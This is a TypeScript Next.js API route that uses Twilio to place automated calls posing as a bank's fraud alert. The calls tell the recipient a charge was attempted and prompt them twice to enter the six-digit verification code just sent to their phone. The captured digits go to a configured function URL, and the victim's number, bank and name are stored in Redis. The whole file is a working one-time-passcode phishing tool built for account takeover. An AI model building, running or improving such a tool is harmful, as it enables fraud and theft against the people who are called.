import { NextRequest, NextResponse } from 'next/server';
import twilio from 'twilio';
import { Redis } from '@upstash/redis';

const ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID!;
const AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN!;
const TWILIO_PHONE_NUMBER = process.env.TWILIO_PHONE_NUMBER!;
const TWILIO_FUNCTION_URL = process.env.TWILIO_FUNCTION_URL!;

const client = twilio(ACCOUNT_SID, AUTH_TOKEN);
const redis = Redis.fromEnv();

export async function POST(req: NextRequest) {
  const { phoneNumber, bank, callerName } = await req.json();

  try {
    const response = new twilio.twiml.VoiceResponse();
    
    // Construct the initial message with optional bank and name details
    let initialMessage = 'Hello.';
    if (callerName) {
      initialMessage += ` ${callerName},`;
    }
    initialMessage += ' We detected an attempt to charge your account';
    if (bank) {
      initialMessage += ` with ${bank}`;
    }
    initialMessage += '. If this wasn\'t you, please enter the 6-digit verification code sent to your phone to secure your account.';

    response.say({
      voice: 'Polly.Joanna',
      language: 'en-US'
    }, initialMessage);

    // First gather attempt
    const gather1 = response.gather({
      numDigits: 6,
      timeout: 15,
      action: TWILIO_FUNCTION_URL,
      method: 'POST',
      input: ['dtmf']
    });
    gather1.say({
      voice: 'Polly.Joanna',
      language: 'en-US'
    }, 'Please enter your verification code now.');

    // Second gather attempt
    response.say({
      voice: 'Polly.Joanna',
      language: 'en-US'
    }, 'Sorry, we didn\'t receive your input. Please try again.');
    
    const gather2 = response.gather({
      numDigits: 6,
      timeout: 15,
      action: TWILIO_FUNCTION_URL,
      method: 'POST',
      input: ['dtmf']
    });
    gather2.say({
      voice: 'Polly.Joanna',
      language: 'en-US'
    }, 'Final attempt. Please enter your verification code.');

    response.say({
      voice: 'Polly.Joanna',
      language: 'en-US'
    }, 'We could not verify your code. Goodbye.');

    const call = await client.calls.create({
      to: phoneNumber,
      from: TWILIO_PHONE_NUMBER,
      twiml: response.toString()
    });

    // Store the call information in Redis with more detailed logging
    await redis.set(`call:${call.sid}`, JSON.stringify({ 
      phoneNumber, 
      bank,
      callerName,
      status: call.status,
      createdAt: new Date().toISOString()
    }), { ex: 3600 });

    // Log the call SID for easier debugging
    console.log(`Call initiated. Call SID: ${call.sid}, Phone Number: ${phoneNumber}, Bank: ${bank || 'N/A'}, Caller Name: ${callerName || 'N/A'}`);

    return NextResponse.json({ 
      callSid: call.sid, 
      status: call.status,
      debugInfo: {
        phoneNumber,
        bank,
        callerName,
        createdAt: new Date().toISOString()
      }
    });
  } catch (error) {
    console.error('Error initiating call:', error);
    return NextResponse.json({ 
      error: 'Failed to initiate call', 
      details: error instanceof Error ? error.message : 'Unknown error' 
    }, { status: 500 });
  }
}